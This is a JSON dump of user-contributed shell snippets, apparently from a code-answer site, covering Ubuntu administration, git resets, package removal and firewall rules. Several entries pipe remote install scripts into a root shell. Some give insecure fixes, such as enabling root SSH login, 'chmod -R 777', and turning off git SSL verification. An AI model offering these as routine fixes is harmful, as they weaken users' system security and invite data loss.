    "description": "sed -i 's/original/new/g' file.txt \nsed -i 's/old-text/new-text/g' input.txt\nsed -i 's/foo/bar/g' hello.txt\necho dog dog dos | sed -e 's:dog:log:g'  #You can also use the above answer with appropriate slashes like echo \"grepper is a nice grepper\" | sed \"s/grepper/blow/g\"\n",
    "reg_date": "2021-10-11T22:12:42.000Z"
  },
  {
    "id": 4697,
    "keyword": null,
    "link": null,
    "title": " ubuntu restart mariadb",
    "description": "systemctl start mariadb systemctl stop mariadb systemctl restart mariadb\n",
    "reg_date": "2021-10-11T22:12:42.000Z"
  },
  {
    "id": 4698,
    "keyword": null,
    "link": null,
    "title": " ubuntu restart sound",
    "description": "pulseaudio -k && sudo alsa force-reload\n",
    "reg_date": "2021-10-11T22:12:42.000Z"
  },
  {
    "id": 4699,
    "keyword": null,
    "link": null,
    "title": " ubuntu root login ssh",
    "description": "echo \"PermitRootLogin yes\" | sudo tee -a /etc/ssh/sshd_config sudo systemctl restart sshd  # NOTE: root login is locked by default, assign a password with: # [sudo passwd root]  # To lock root login afterwards run # [sudo passwd -l root]  # To disable root login over ssh afterwards run # [sed '$d' /etc/ssh/sshd_config | sudo tee /etc/ssh/sshd_config]\n",
    "reg_date": "2021-10-11T22:12:42.000Z"
  },
  {
    "id": 4700,
    "keyword": null,
    "link": null,
    "title": " ubuntu server change timezone",
    "description": "$ sudo dpkg-reconfigure tzdata\n",
    "reg_date": "2021-10-11T22:12:42.000Z"
  },
  {
    "id": 4701,
    "keyword": null,
    "link": null,
    "title": " ubuntu server does not run scripts",
    "description": "First, ensure your script begins with the correct hash-bang,  e.g. #!/bin/bash  Then make sure the .sh file is executable -     Open a terminal using Ctrl+Alt+T or from the applications menu     Navigate to the location of the .sh file. e.g.      cd ~/location/to/my/file     Run       chmod u+x <file name>.sh     , or if permission is an issue,      sudo chmod u+x <file name>.sh      and enter your password to confirm     Alternatively, you can right-click the .sh file from the file      browser and update permissions via the Properties option\n",
    "reg_date": "2021-10-11T22:12:42.000Z"
  },
  {
    "id": 4702,
    "keyword": null,
    "link": null,
    "title": " ubuntu server login logs",
    "description": "sudo less /var/log/auth.log or last\n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4703,
    "keyword": null,
    "link": null,
    "title": " ubuntu server virtualbox check if guest additions installed",
    "description": "lsmod | grep vboxguest\n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4704,
    "keyword": null,
    "link": null,
    "title": " ubuntu set scale to 150",
    "description": "gsettings set org.gnome.desktop.interface text-scaling-factor 1.2 \n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4705,
    "keyword": null,
    "link": null,
    "title": " ubuntu set sudoers to use vim",
    "description": "sudo update-alternatives --config editor\n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4706,
    "keyword": null,
    "link": null,
    "title": " ubuntu settings missing",
    "description": "# Settings icon missing? # Open settings from the terminal gnome-control-center  # If it is (somehow) not installed anymore..: sudo apt install gnome-control-center  # Else: sudo apt remove --purge gnome-control-center sudo apt install gnome-control-center\nrun $ sudo apt-get install ubuntu-desktop\nsudo apt install gnome-control-center  #If you are getting still problem go through the source video \n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4707,
    "keyword": null,
    "link": null,
    "title": " ubuntu show git branch in terminal",
    "description": "# Show git branch name force_color_prompt=yes color_prompt=yes parse_git_branch() {  git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/' } if [ \"$color_prompt\" = yes ]; then  PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[01;31m\\]$(parse_git_branch)\\[\\033[00m\\]\\$ ' else  PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w$(parse_git_branch)\\$ ' fi unset color_prompt force_color_prompt \n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4708,
    "keyword": null,
    "link": null,
    "title": " ubuntu show line in file containing text",
    "description": "grep -hnr \"the_string\" /media/slowly/DATA/lots_of_files \n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4709,
    "keyword": null,
    "link": null,
    "title": " ubuntu slack install",
    "description": "wget https://downloads.slack-edge.com/linux_releases/slack-desktop-4.0.2-amd64.deb sudo apt install ./slack-desktop-*.deb \nsudo snap install slack --classic\nsudo snap install slack --classicCopy\nwget https://downloads.slack-edge.com/linux_releases/slack-desktop-4.0.2-amd64.deb\n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4710,
    "keyword": null,
    "link": null,
    "title": " ubuntu spotify",
    "description": "#On ubuntu can just type following command: snap install spotify #if that not works you can also try to install the debian package #you will need for this 'curl' so install that first sudo apt install curl #after installing curl or you already have installed curl you shuld run this command curl -sS https://download.spotify.com/debian/pubkey_0D811D58.gpg | sudo apt-key add - #and also echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list #after that get update sudo apt-get update #and also the upgrade sudo apt-get upgrade #now install spotify client sudo apt-get install spotify-client #now you can open spotify #users with 4k monitor i recement to scale the app up #else it will be very hard to read the text #open for that again the terminal #open directory /usr/share/applications/ cd /usr/share/applications/ #open spotify.desktop file with sudo sudo gedit spotify.desktop #now change the line Exec=spotify %U #to: Exec=spotify --force-device-scale-factor=2.0 %U #and safe the file #this will scale spotify for 2x while starting #now you can close everything and open spotify\ncurl -sS https://download.spotify.com/debian/pubkey_0D811D58.gpg | sudo apt-key add -  echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list sudo apt-get update && sudo apt-get install spotify-client\ncurl -sS https://download.spotify.com/debian/pubkey.gpg | sudo apt-key add -  echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list sudo apt-get update && sudo apt-get install spotify-client\ncurl -sS https://download.spotify.com/debian/pubkey_0D811D58.gpg | sudo apt-key add - echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list\n",
    "reg_date": "2021-10-11T22:12:43.000Z"
  },
  {
    "id": 4711,
    "keyword": null,
    "link": null,
    "title": " ubuntu start nginx",
    "description": "sudo systemctl restart nginx\nsudo systemctl start nginx\nsudo apt update sudo apt install nginx\nsystemctl reload nginx \nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4712,
    "keyword": null,
    "link": null,
    "title": " ubuntu stop process on port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\nsudo kill -9 $(sudo lsof -t -i:9001) \n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4713,
    "keyword": null,
    "link": null,
    "title": " ubuntu system restart required",
    "description": "sudo reboot\n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4714,
    "keyword": null,
    "link": null,
    "title": " ubuntu terminal find file recursive",
    "description": "sudo find . -print | grep -i '.*[.]xml' \n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4715,
    "keyword": null,
    "link": null,
    "title": " ubuntu top bar hide",
    "description": "sudo apt install gnome-shell-extension-autohidetopbar  For Ubuntu 20.04  Alt + F Type \"r\" and press Enter to reload gnome shell\n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4716,
    "keyword": null,
    "link": null,
    "title": " ubuntu trash can won't empty",
    "description": " sudo rm -rf ~/.local/share/Trash/* \n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4717,
    "keyword": null,
    "link": null,
    "title": " ubuntu turn off swap",
    "description": "sudo swapoff -a && sudo sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab\n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4718,
    "keyword": null,
    "link": null,
    "title": " ubuntu tweak",
    "description": "sudo add-apt-repository universe sudo apt install gnome-tweak-tool\n",
    "reg_date": "2021-10-11T22:12:44.000Z"
  },
  {
    "id": 4719,
    "keyword": null,
    "link": null,
    "title": " ubuntu ufw add to autostart",
    "description": "#At first enable ufw sudo ufw enable #second enable autostart sudo systemctl enable ufw\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4720,
    "keyword": null,
    "link": null,
    "title": " ubuntu unable to write file",
    "description": "sudo chmod -R 777 your file path \n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4721,
    "keyword": null,
    "link": null,
    "title": " ubuntu uninstall chrome",
    "description": "// Solution 1: sudo apt-get remove google-chrome-stable  // Solution 2:  sudo apt-get purge google-chrome-stable sudo apt-get autoremove\nsudo apt purge google-chrome-stable\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4722,
    "keyword": null,
    "link": null,
    "title": " ubuntu uninstall mosquitto",
    "description": "sudo apt-get purge --remove mosquitto* sudo apt-add-repository --remove ppa:mosquitto-dev/mosquitto-ppa\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4723,
    "keyword": null,
    "link": null,
    "title": " ubuntu uninstall redis",
    "description": "sudo apt-get purge --auto-remove redis-server  # Check if there is any packages left apt list --installed | grep redis\n# restart redis service sudo service redis-server restart  # stop redis service sudo service redis-server stop\nsudo apt update sudo apt install redis-server  sudo systemctl restart redis.service  sudo systemctl status redis  redis-cli\napt-get purge --auto-remove redis-servers # check if the package is present or not apt-cache policy redis-server \nsudo micro /etc/redis/redis.conf\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4724,
    "keyword": null,
    "link": null,
    "title": " ubuntu uninstall thingsboard",
    "description": "sudo dpkg -l | grep thingsboard sudo dpkg -r thingsboard sudo dpkg -P thingsboard sudo dpkg -l | grep thingsboard\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4725,
    "keyword": null,
    "link": null,
    "title": " ubuntu unzip file",
    "description": "// install sudo apt install zip unzip  // zip zip -r example.zip original_folder  // unzip unzip file.zip -d destination_folder\nZip-unzip utility: sudo apt-get install zip unzip navigate to the place where the zip belongs and, unzip test.zip, where test.zip is the zip file to extract\nunzip file.zip -d destination_folder \napt-get install unzip \nunzip zipped_file.zip -d unzipped_directory\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4726,
    "keyword": null,
    "link": null,
    "title": " ubuntu update firefox",
    "description": "// update firefox the same command as install sudo apt install firefox\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4727,
    "keyword": null,
    "link": null,
    "title": " ubuntu update nodejs",
    "description": "curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install -y nodejs\n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_13.x | bash - apt-get install -y nodejs \nsudo npm cache clean -f sudo npm install -g n sudo n stable \n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_12.x | bash - apt-get install -y nodejs \ncurl -sL https://deb.nodesource.com/setup_15.x | sudo -E bash - sudo apt-get install -y nodejs\n",
    "reg_date": "2021-10-11T22:12:45.000Z"
  },
  {
    "id": 4728,
    "keyword": null,
    "link": null,
    "title": " ubuntu use pip as pip3",
    "description": "sudo apt-get -y install python3-pip\nalias pip=pip3 \n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4729,
    "keyword": null,
    "link": null,
    "title": " ubuntu version command line",
    "description": "cat /etc/os-release\ncat /etc/issue\n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4730,
    "keyword": null,
    "link": null,
    "title": " ubuntu view disk space ec2",
    "description": "df -hT /dev/xvda1\n#To check disk space: # Using Linux Command df -h  #output Filesystem      Size  Used Avail Use% Mounted on /dev/xvda2       38G   26G  9.7G  73% /  # Using AWS CLI aws ec2 describe-volumes --filters Name=attachment.instance-id,Values=i-1234567890abcdef0  #output {     \"Volumes\": [         {             \"AvailabilityZone\": \"us-east-1a\",             \"Attachments\": [                 {                     \"AttachTime\": \"2013-12-18T22:35:00.000Z\",                     \"InstanceId\": \"i-1234567890abcdef0\",                     \"VolumeId\": \"vol-049df61146c4d7901\",                     \"State\": \"attached\",                     \"DeleteOnTermination\": true,                     \"Device\": \"/dev/sda1\"                 }             ],             \"Encrypted\": false,             \"VolumeType\": \"gp2\",             \"VolumeId\": \"vol-049df61146c4d7901\",             \"State\": \"in-use\",             \"SnapshotId\": \"snap-1234567890abcdef0\",             \"CreateTime\": \"2013-12-18T22:35:00.084Z\",             \"Size\": 8         }     ] }\n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4731,
    "keyword": null,
    "link": null,
    "title": " ubuntu virtualbox 1920x1080",
    "description": "xrandr --newmode \"1920x1080\"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync xrandr --addmode Virtual1 1920x1080 xrandr --output Virtual1 --mode 1920x1080 \n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4732,
    "keyword": null,
    "link": null,
    "title": " ubuntu zip file",
    "description": "zip -r mynewfilename.zip foldertozip/\nzip -r example.zip original_folder \napt-get update apt-get install zip unzip\nzip -r output_file.zip file1 folder1\nunzip file.zip -d destination_folder \nzip -r compressed_filename.zip foldername\n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4733,
    "keyword": null,
    "link": null,
    "title": " ubuntu zip folder",
    "description": "zip -r filename.zip /path/to/folder1\nzip -r example.zip original_folder \nzip -r filename.zip folder zip -r filename.zip folder1 folder2 zip -r filename.zip /path/to/folder1 /path/to/file2\nzip -r output_file.zip file1 folder1\nzip -r compressed_filename.zip foldername\nubuntu zip folder\n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4734,
    "keyword": null,
    "link": null,
    "title": " ubunutu stats top menu bar",
    "description": "sudo apt install indicator-multiload\n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4735,
    "keyword": null,
    "link": null,
    "title": " ufw allow http and httpw connections",
    "description": "sudo ufw allow http sudo ufw allow https sudo ufw enable\nsudo ufw allow http sudo ufw allow 80  \n",
    "reg_date": "2021-10-11T22:12:46.000Z"
  },
  {
    "id": 4736,
    "keyword": null,
    "link": null,
    "title": " ufw allow port",
    "description": "sudo ufw allow http sudo ufw allow 80  \nsudo ufw allow from 15.15.15.0/24  to any port 22 \nsudo ufw allow from 134.243.212.34 to any port 22\n",
    "reg_date": "2021-10-11T22:12:47.000Z"
  },
  {
    "id": 4737,
    "keyword": null,
    "link": null,
    "title": " ufw allow postgresql",
    "description": "sudo ufw allow 5432\n",
    "reg_date": "2021-10-11T22:12:47.000Z"
  },
  {
    "id": 4738,
    "keyword": null,
    "link": null,
    "title": " ufw config file location ubuntu",
    "description": "sudo nano /etc/ufw/user.rules\n",
    "reg_date": "2021-10-11T22:12:47.000Z"
  },
  {
    "id": 4739,
    "keyword": null,
    "link": null,
    "title": " ufw inactive",
    "description": "sudo ufw enable\n$ sudo ufw disable Firewall stopped and disabled on system startup \n$ sudo ufw status Status: inactive \n",
    "reg_date": "2021-10-11T22:12:47.000Z"
  },
  {
    "id": 4740,
    "keyword": null,
    "link": null,
    "title": " ultimate power plan windows 10",
    "description": "// run this on cmd powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61\npowercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61\n",
    "reg_date": "2021-10-11T22:12:47.000Z"
  },
  {
    "id": 4741,
    "keyword": null,
    "link": null,
    "title": " unable to create process using ' ' virtualenv",
    "description": "python -m pip install --upgrade pip \npython -m pip  #example [python -m pip install tensorflow]\n",
    "reg_date": "2021-10-11T22:12:47.000Z"
  },
  {
    "id": 4742,
    "keyword": null,
    "link": null,
    "title": " unable to get local issuer certificate git",
    "description": "git config --global http.sslVerify false\n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4743,
    "keyword": null,
    "link": null,
    "title": " unable to install deno in ubuntu",
    "description": "curl -fsSL https://deno.land/x/install/install.sh | sudo DENO_INSTALL=/usr/local sh\n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4744,
    "keyword": null,
    "link": null,
    "title": " unable to resolve 'react-native-gesture-handler'",
    "description": "expo install react-native-gesture-handler\nyarn add react-native-gesture-handler  react-native link react-native-gesture-handler\n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4745,
    "keyword": null,
    "link": null,
    "title": " unable to resolve module safe area context from index.tsx",
    "description": "$ npm install react-native-safe-area-context $ expo start -c \n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4746,
    "keyword": null,
    "link": null,
    "title": " unable to resolve reference git",
    "description": "git gc --prune=now git remote prune origin rm .git/refs/remotes/origin/master git fetch git pull origin master\nrm .git/refs/remotes/origin/master git fetch --prune\n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4747,
    "keyword": null,
    "link": null,
    "title": " unable to start ssh-agent service, error :1058",
    "description": " > Get-Service -Name ssh-agent | Set-Service -StartupType Manual \n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4748,
    "keyword": null,
    "link": null,
    "title": " uncompress tar",
    "description": "tar -xvf filename.tar\ntar -xvf yourfile.tar.gz\n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4749,
    "keyword": null,
    "link": null,
    "title": " undefined reference to `sem init'",
    "description": "If you are on a linux system, you will need to compile and link with  the -pthread flag to link the pthreads library.   $ gcc -pthread FileName.c\n",
    "reg_date": "2021-10-11T22:12:48.000Z"
  },
  {
    "id": 4750,
    "keyword": null,
    "link": null,
    "title": " undo add stage git",
    "description": "git reset \ngit reset <file> \n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4751,
    "keyword": null,
    "link": null,
    "title": " undo commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\n# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --hard HEAD~1 \n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4752,
    "keyword": null,
    "link": null,
    "title": " undo commit git before push",
    "description": "# Removes latest commit from the stash, KEEPS changes git reset --soft HEAD~  # Removes latest commit from the stash, DELETES changes git reset --hard HEAD~\ngit reset HEAD~       \ngit reset <hash> # Run this then merge, commit, and push\n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4753,
    "keyword": null,
    "link": null,
    "title": " undo git",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\ngit reset HEAD@{1}\n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4754,
    "keyword": null,
    "link": null,
    "title": " undo git add before commit",
    "description": "// undo add for one file git reset <file>  // undo add for all files git reset\ngit reset \ngit reset # Will unstage all the files you've added after your last commit\n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4755,
    "keyword": null,
    "link": null,
    "title": " undo git pull",
    "description": "git reset --hard master@{\"10 minutes ago\"}\ngit reset --hard master@{\"10 minutes ago\"}  -----------------------------------------  git reset --keep HEAD@{1} \ngit reset --hard master@{\"10 minutes ago\"} \n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4756,
    "keyword": null,
    "link": null,
    "title": " undo last commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --hard HEAD~1\ngit reset HEAD~ \n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4757,
    "keyword": null,
    "link": null,
    "title": " undo last commit git",
    "description": "# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --soft HEAD~1 \n",
    "reg_date": "2021-10-11T22:12:49.000Z"
  },
  {
    "id": 4758,
    "keyword": null,
    "link": null,
    "title": " undo local commit",
    "description": "# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\n$ git reset --soft HEAD~1\n$ git reset --hard HEAD~1 \n$ git reset HEAD^ \ngit reset <commitId> # Exemple git reset 5310517\n$ git commit -m \"Something terribly misguided\" # (0: Your Accident) $ git reset HEAD~                              # (1) [ edit files as necessary ]                    # (2) $ git add .                                    # (3) $ git commit -c ORIG_HEAD                      # (4) \n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4759,
    "keyword": null,
    "link": null,
    "title": " unetbootin ubuntu install",
    "description": "sudo add-apt-repository ppa:gezakovacs/ppa sudo apt-get update sudo apt-get install unetbootin \n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4760,
    "keyword": null,
    "link": null,
    "title": " uniinstall nginx",
    "description": "sudo apt-get purge nginx nginx-common \n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4761,
    "keyword": null,
    "link": null,
    "title": " uninstaall mongodb from centos7",
    "description": "1)Stop MongoDB. Stop the mongod process by issuing the following command:  \tsudo service mongod stop 2)Remove Packages. Remove any MongoDB packages that you had previously installed.  \tsudo yum erase $(rpm -qa | grep mongodb-org)  3)Remove Data Directories.  Remove MongoDB databases and log files.      sudo rm -r /var/log/mongodb     sudo rm -r /var/lib/mongo\n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4762,
    "keyword": null,
    "link": null,
    "title": " uninstall anaconda ubuntu",
    "description": "conda install anaconda-clean   # install the package anaconda clean anaconda-clean --yes           # clean all anaconda related files and directories  rm -rf ~/anaconda3             # removes the entire anaconda directory  rm -rf ~/.anaconda_backup       # anaconda clean creates a back_up of files/dirs, remove it                                  # (conda list; cmd shouldn't respond after the clean up)\n#Install anaconda-clean conda install anaconda-clean  #start anaconda-clean anaconda-clean --yes\nsudo rm -rf ~/anaconda3 ~/.condarc ~/.conda ~/.continuum  remove path from .bashrc file which looks like: PATH=\"/home/myuser/anaconda3/bin:$PATH source ~/.bashrc\nrm -rf ~/anaconda3 ~/.condarc ~/.conda ~/.continuum #To execute in terminal\n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4763,
    "keyword": null,
    "link": null,
    "title": " uninstall angular cli",
    "description": "npm uninstall -g @angular/cli npm cache clean --force \n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4764,
    "keyword": null,
    "link": null,
    "title": " uninstall apache2 ubuntu",
    "description": "#stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2    # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2   \nsudo apt-get remove --purge apache2 apache2-data apache2-utils\nsudo apt autoremove sudo apt remove apache2 sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common\n$sudo service apache2 stop  $ sudo apt-get purge apache2 apache2-utils apache2.2-bin apache2-common $ sudo apt-get autoremove  $ whereis apache2\n#How to completely remove Apache2 on Ubuntu 20.04 and similar distributions.  #stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2     # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2    @Oceangreen Technology - We Work For Excellence\n",
    "reg_date": "2021-10-11T22:12:50.000Z"
  },
  {
    "id": 4765,
    "keyword": null,
    "link": null,
    "title": " uninstall brew from linux",
    "description": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall.sh)\"\n",
    "reg_date": "2021-10-11T22:12:51.000Z"
  },
  {
    "id": 4766,
    "keyword": null,
    "link": null,
    "title": " uninstall certbot ubuntu 16 nginx",
    "description": "$ sudo certbot delete\n",
    "reg_date": "2021-10-11T22:12:51.000Z"
  },
  {
    "id": 4767,
    "keyword": null,
    "link": null,
    "title": " uninstall cocoapods",
    "description": "sudo gem uninstall cocoapods sudo gem list cocoapods-core gem list cocoapods \nsudo gem install cocoapods-deintegrate cocoapods-clean pod deintegrate pod clean rm Podfile\n",
    "reg_date": "2021-10-11T22:12:51.000Z"
  },
  {
    "id": 4768,
    "keyword": null,
    "link": null,
    "title": " uninstall cordova plugin",
    "description": "cordova plugin remove <PLUGIN_NAME> \n// First, you should list your plugins: cordova plugin list  // With this result, you can simply do: cordova plugin remove <PLUGIN_NAME>  // For example: cordova plugin remove org.apache.cordova.media  Hope it helps.\n",
    "reg_date": "2021-10-11T22:12:51.000Z"
  },
  {
    "id": 4769,
    "keyword": null,
    "link": null,
    "title": " uninstall dependencies npm",
    "description": "The command is simply npm uninstall <name> // Here are different options: // - removes the module from node_modules but  //   does NOT update package.json npm uninstall <name>  // - removes it from dependencies in package.json aswell npm uninstall <name> --save  // - removes it from devDependencies in package.json aswell npm uninstall <name> --save-dev  // -  also removes it globally  npm uninstall -g <name> --save   //    If you're removing a global package, however, any applications  //    referencing it will crash.  // A local install will be in the node_modules/ directory of your  //  application. This won't affect the application if a module remains //  there with no references to it.  // The Node.js documents https://npmjs.org/doc/ have all the commands // that you need to know with npm.\nnpm uninstall <package_name> //Example npm uninstall mongoose //A tip ctrl+c helps to terminate a job in terminal\nnpm uninstall <module_name>  \nnpm uninstall nodemon\nnpm uninstall sax \nnpm uninstall <package_name>\n",
    "reg_date": "2021-10-11T22:12:51.000Z"
  },
  {
    "id": 4770,
    "keyword": null,
    "link": null,
    "title": " uninstall foxit reader",
    "description": "# Ubuntu 20.10 remove foxit reader cd ~/opt/foxitsoftware/foxitreader bash maintenancetool.sh\n",
    "reg_date": "2021-10-11T22:12:52.000Z"
  },
  {
    "id": 4771,
    "keyword": null,
    "link": null,
    "title": " uninstall franz ubuntu",
    "description": "sudo apt-get remove <application_name> \n",
    "reg_date": "2021-10-11T22:12:52.000Z"
  },
  {
    "id": 4772,
    "keyword": null,
    "link": null,
    "title": " uninstall k3s",
    "description": "### Uninstall k3s from server node /usr/local/bin/k3s-uninstall.sh  ### Uninstall k3s from agent node /usr/local/bin/k3s-agent-uninstall.sh \n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4773,
    "keyword": null,
    "link": null,
    "title": " uninstall libreoffice ubuntu",
    "description": "sudo apt-get remove --purge libreoffice* sudo apt-get clean sudo apt-get autoremove \n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4774,
    "keyword": null,
    "link": null,
    "title": " uninstall lightdm",
    "description": "sudo apt-get purge lightdm\n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4775,
    "keyword": null,
    "link": null,
    "title": " uninstall mariadb server and client  in ubuntu 18.4",
    "description": "sudo systemctl stop mysql sudo apt-get remove --purge mysql-server mysql-client mysql-common \nsudo apt-get autoclean sudo rm -rf /var/lib/mysql/ sudo rm -rf /etc/mysql/ \nsudo apt-get autoremove \n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4776,
    "keyword": null,
    "link": null,
    "title": " uninstall mongodb ubuntu",
    "description": "sudo apt-get purge mongodb-org* \nsudo apt update sudo apt install -y mongodb //checking service and db sudo systemctl status mongodb or service mongodb status //start service sudo systemctl start mongod or service mongodb start //stop service sudo systemctl stop mongod  or service mongodb stop \nsudo rm -r /var/log/mongodb sudo rm -r /var/lib/mongodb \nsudo systemctl start mongod sudo systemctl stop mongod\nsudo yum erase $(rpm -qa | grep mongodb-enterprise) \n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4777,
    "keyword": null,
    "link": null,
    "title": " uninstall nginx",
    "description": "sudo apt-get purge nginx nginx-common \nsudo apt-get remove nginx* --purge\n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4778,
    "keyword": null,
    "link": null,
    "title": " uninstall node from linux debian",
    "description": "sudo rm -rf /usr/local/bin/npm /usr/local/share/man/man1/node* /usr/local/lib/dtrace/node.d ~/.npm ~/.node-gyp /opt/local/bin/node /opt/local/include/node /opt/local/lib/node_modules   sudo rm -rf /usr/local/lib/node*  sudo rm -rf /usr/local/include/node*  sudo rm -rf /usr/local/bin/node*\n",
